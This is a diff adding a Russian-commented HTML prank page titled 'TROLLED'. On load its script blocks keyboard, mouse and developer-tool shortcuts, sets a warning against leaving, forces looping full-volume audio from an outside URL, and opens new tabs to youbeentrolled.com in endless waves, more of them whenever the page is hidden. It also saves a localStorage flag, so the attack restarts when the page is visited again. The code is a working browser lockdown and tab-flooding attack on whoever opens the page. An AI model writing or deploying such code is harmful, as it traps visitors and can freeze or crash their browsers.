@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔴 TROLLED</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            width: 100vw; height: 100vh; overflow: hidden;
+            background: #000; display: flex;
+            justify-content: center; align-items: center;
+            font-family: 'Impact', 'Arial Black', sans-serif;
+            user-select: none; position: relative;
+            cursor: none;
+        }
+        .troll-container {
+            position: relative; width: 100%; height: 100%;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            background: radial-gradient(circle, #1a0000, #000000);
+            animation: pulse 0.3s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { background: radial-gradient(circle, #1a0000, #000000); }
+            50% { background: radial-gradient(circle, #ff0000, #000000); }
+        }
+        .troll-gif {
+            width: 100%; height: 100%; object-fit: contain;
+            position: absolute; top: 0; left: 0; z-index: 1;
+            opacity: 0.9; pointer-events: none;
+            filter: drop-shadow(0 0 80px rgba(255,0,0,0.5)) brightness(1.2);
+        }
+        .troll-text {
+            position: relative; z-index: 2;
+            color: #ff0044;
+            font-size: clamp(2rem, 12vw, 8rem);
+            font-weight: 900; text-transform: uppercase;
+            text-align: center;
+            text-shadow: 0 0 20px rgba(255,0,68,0.8), 0 0 40px rgba(255,0,68,0.5), 0 0 80px rgba(255,0,68,0.3), 0 4px 0 #880022, 0 8px 0 #660011, 0 12px 0 #440008, 0 16px 10px rgba(0,0,0,0.8);
+            letter-spacing: 0.1em;
+            animation: shake 0.1s infinite;
+            padding: 20px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+            backdrop-filter: blur(5px);
+            border: 3px solid #ff0044;
+            box-shadow: 0 0 100px rgba(255,0,68,0.2);
+            transform: rotate(-5deg);
+        }
+        @keyframes shake {
+            0%, 100% { transform: rotate(-5deg) scale(1); }
+            25% { transform: rotate(0deg) scale(1.05); }
+            50% { transform: rotate(5deg) scale(1); }
+            75% { transform: rotate(0deg) scale(0.95); }
+        }
+        .troll-sub {
+            position: relative; z-index: 2;
+            color: #ff6688;
+            font-size: clamp(0.8rem, 3vw, 2rem);
+            font-family: 'Courier New', monospace;
+            margin-top: 20px;
+            text-shadow: 0 0 30px rgba(255,0,68,0.5);
+            animation: blink 0.1s infinite;
+            background: rgba(0,0,0,0.5);
+            padding: 10px 30px;
+            border-radius: 50px;
+            border: 1px solid #ff0044;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        .music-indicator {
+            position: fixed; bottom: 20px; right: 20px; z-index: 999;
+            color: #ff0044; font-size: 14px;
+            font-family: 'Courier New', monospace;
+            background: rgba(0,0,0,0.9);
+            padding: 12px 18px;
+            border-radius: 20px;
+            border: 2px solid #ff0044;
+            animation: blink 0.5s infinite;
+            opacity: 0.8;
+            font-weight: bold;
+        }
+        @media (max-width: 480px) {
+            .troll-text { font-size: clamp(1.8rem, 10vw, 4rem); padding: 10px 20px; transform: rotate(-3deg); }
+            .troll-sub { font-size: clamp(0.6rem, 2.5vw, 1rem); padding: 6px 16px; }
+        }
+        .troll-container { animation: fadeIn 0.5s ease-out; }
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .troll-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 0; }
+        .confetti { position: fixed; z-index: 0; color: #ff0044; font-size: 24px; animation: fall linear infinite; opacity: 0.3; pointer-events: none; }
+        @keyframes fall {
+            0% { transform: translateY(-100vh) rotate(0deg); }
+            100% { transform: translateY(100vh) rotate(720deg); }
+        }
+        .overlay-block {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 9999; background: transparent;
+            pointer-events: all;
+        }
+        #blockScreen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.01);
+            z-index: 9998;
+            pointer-events: all;
+        }
+    </style>
+</head>
+<body>
+    <div id="blockScreen"></div>
+    <div class="troll-bg"></div>
+    <div class="troll-container">
+        <img class="troll-gif" src="https://i.pinimg.com/originals/a8/01/32/a80132507ba34499b157be336517c72b.gif" alt="TROLL" loading="eager">
+        <div class="troll-text">🔴 YOU'VE BEEN<br>TROLLED</div>
+        <div class="troll-sub">⚡ HAHA NICE TRY ⚡</div>
+        <div class="music-indicator" id="statusIndicator">🔊 PHONK MAX</div>
+    </div>
+
+    <script>
+        // ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
+        let isTrolled = false;
+        let tabCount = 0;
+        let audioContext = null;
+        let audio = null;
+        let audioStarted = false;
+        let tabInterval = null;
+        
+        // ========== БЛОКИРОВКА КЛАВИАТУРЫ ==========
+        function blockKeyboard() {
+            document.addEventListener('keydown', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                // Блокируем все комбинации
+                if (e.ctrlKey || e.altKey || e.metaKey || e.shiftKey) {
+                    e.preventDefault();
+                    return false;
+                }
+                
+                // Блокируем системные клавиши
+                const blockedKeys = [
+                    'F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
+                    'Escape','Tab','CapsLock','Shift','Control','Alt','Meta',
+                    'PrintScreen','ScrollLock','Pause','Insert','Home','End',
+                    'PageUp','PageDown','Delete','ContextMenu'
+                ];
+                
+                if (blockedKeys.includes(e.key)) {
+                    e.preventDefault();
+                    return false;
+                }
+                
+                // Блокируем комбинации с Ctrl
+                if (e.ctrlKey && ['w','W','t','T','n','N','r','R','s','S','p','P','a','A','c','C','v','V','x','X','z','Z','y','Y'].includes(e.key)) {
+                    e.preventDefault();
+                    return false;
+                }
+                
+                // Блокируем Alt+F4
+                if (e.altKey && e.key === 'F4') {
+                    e.preventDefault();
+                    return false;
+                }
+                
+                // Блокируем Alt+Tab
+                if (e.altKey && e.key === 'Tab') {
+                    e.preventDefault();
+                    return false;
+                }
+                
+                // Блокируем Win ключ
+                if (e.key === 'Meta' || e.key === 'Windows') {
+                    e.preventDefault();
+                    return false;
+                }
+                
+                return false;
+            }, true);
+            
+            // Блокируем клавиатурные события на всех уровнях
+            document.addEventListener('keyup', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            
+            document.addEventListener('keypress', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+        }
+
+        // ========== БЛОКИРОВКА МЫШИ ==========
+        function blockMouse() {
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            document.addEventListener('selectstart', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            // Блокируем выделение
+            document.addEventListener('mousedown', function(e) {
+                if (e.button === 2) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+        }
+
+        // ========== БЛОКИРОВКА ЗАКРЫТИЯ ==========
+        function blockClose() {
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
+                return '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
+            };
+        }
+
+        // ========== ИНИЦИАЛИЗАЦИЯ АУДИО ==========
+        function initAudio() {
+            audio = new Audio();
+            audio.src = 'https://audio.com/djxavier014/collections/troll-face-phonk/stream';
+            audio.loop = true;
+            audio.volume = 1.0;
+            audio.muted = false;
+        }
+
+        // ========== МАКСИМАЛЬНЫЙ АВТОПЛЕЙ ==========
+        function forcePlayAudio() {
+            if (audioStarted) return;
+            
+            audio.play().then(() => {
+                audioStarted = true;
+                audio.volume = 1.0;
+                document.getElementById('statusIndicator').textContent = '🔊 PHONK MAX';
+            }).catch(() => {
+                // Бесконечные попытки
+                const tryPlay = setInterval(() => {
+                    audio.play().then(() => {
+                        audioStarted = true;
+                        audio.volume = 1.0;
+                        clearInterval(tryPlay);
+                        document.getElementById('statusIndicator').textContent = '🔊 PHONK MAX';
+                    }).catch(() => {});
+                }, 100);
+            });
+        }
+
+        // ========== БЕСКОНЕЧНЫЙ СПАВН ВКЛАДОК ==========
+        function spawnTabs(count = 10) {
+            for (let i = 0; i < count; i++) {
+                setTimeout(() => {
+                    try {
+                        const win = window.open('https://youbeentrolled.com', '_blank');
+                        if (!win) {
+                            // Если блокирует - открываем через location
+                            if (tabCount % 5 === 0) {
+                                window.location.href = 'https://youbeentrolled.com';
+                            }
+                        }
+                        tabCount++;
+                        document.getElementById('statusIndicator').textContent = `📊 ВКЛАДОК: ${tabCount}`;
+                    } catch(e) {
+                        // Игнорируем ошибки
+                    }
+                }, i * 50);
+            }
+        }
+
+        // ========== БЕСКОНЕЧНЫЙ ЦИКЛ ==========
+        function startInfiniteTabs() {
+            // Первая волна
+            spawnTabs(20);
+            
+            // Бесконечный цикл
+            tabInterval = setInterval(() => {
+                if (tabCount < 200) {
+                    spawnTabs(5);
+                } else {
+                    // Если слишком много - замедляем
+                    clearInterval(tabInterval);
+                    tabInterval = setInterval(() => {
+                        spawnTabs(2);
+                    }, 3000);
+                }
+            }, 1000);
+        }
+
+        // ========== ЭФФЕКТЫ ==========
+        function startEffects() {
+            // Максимальная вибрация
+            document.body.style.animation = 'shake 0.05s infinite';
+            document.querySelector('.troll-container').style.animation = 'pulse 0.2s infinite';
+            
+            // Мерцание текста
+            document.querySelector('.troll-text').style.animation = 'shake 0.05s infinite';
+            document.querySelector('.troll-sub').style.animation = 'blink 0.05s infinite';
+        }
+
+        // ========== СОЗДАНИЕ КОНФЕТТИ ==========
+        function createConfetti() {
+            const symbols = ['🔥', '💀', '⚡', '🔴', '💢', '‼️', '⛔', '💥', '🎯', '😈'];
+            for (let i = 0; i < 60; i++) {
+                const el = document.createElement('div');
+                el.className = 'confetti';
+                el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
+                el.style.left = Math.random() * 100 + '%';
+                el.style.fontSize = (10 + Math.random() * 40) + 'px';
+                el.style.animationDuration = (3 + Math.random() * 8) + 's';
+                el.style.animationDelay = (Math.random() * 5) + 's';
+                document.body.appendChild(el);
+            }
+        }
+
+        // ========== ЗАЩИТА ОТ ИНСПЕКТОРА ==========
+        function blockInspector() {
+            // Блокируем F12
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12') {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && e.key === 'u') {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+            
+            // Блокируем правый клик
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+        }
+
+        // ========== ГЛАВНАЯ ЛОГИКА ==========
+        function startTroll() {
+            if (isTrolled) return;
+            isTrolled = true;
+            
+            // Запускаем аудио
+            forcePlayAudio();
+            
+            // Блокируем всё
+            blockClose();
+            blockKeyboard();
+            blockMouse();
+            blockInspector();
+            
+            // Запускаем эффекты
+            startEffects();
+            
+            // Бесконечные вкладки
+            startInfiniteTabs();
+            
+            // Сохраняем состояние
+            localStorage.setItem('trolled', 'true');
+            localStorage.setItem('trolled_time', Date.now().toString());
+        }
+
+        // ========== ПРОВЕРКА СОСТОЯНИЯ ==========
+        function checkState() {
+            const saved = localStorage.getItem('trolled');
+            if (saved === 'true') {
+                setTimeout(() => {
+                    startTroll();
+                }, 100);
+            }
+        }
+
+        // ========== ЗАГРУЗКА ==========
+        function init() {
+            // Блокируем сразу
+            blockKeyboard();
+            blockMouse();
+            blockInspector();
+            
+            // Инициализация
+            initAudio();
+            createConfetti();
+            
+            // Проверяем состояние
+            checkState();
+            
+            // Автозапуск
+            setTimeout(() => {
+                if (!isTrolled) {
+                    startTroll();
+                }
+            }, 2000);
+            
+            // Защита от закрытия через кнопки
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden && isTrolled) {
+                    // Если пытаются свернуть - форсим
+                    setTimeout(() => {
+                        spawnTabs(5);
+                    }, 100);
+                }
+            });
+        }
+
+        // ========== ЗАПУСК ==========
+        if (document.readyState === 'complete') {
+            init();
+        } else {
+            document.addEventListener('DOMContentLoaded', init);
+        }
+    </script>
+</body>
+</html>
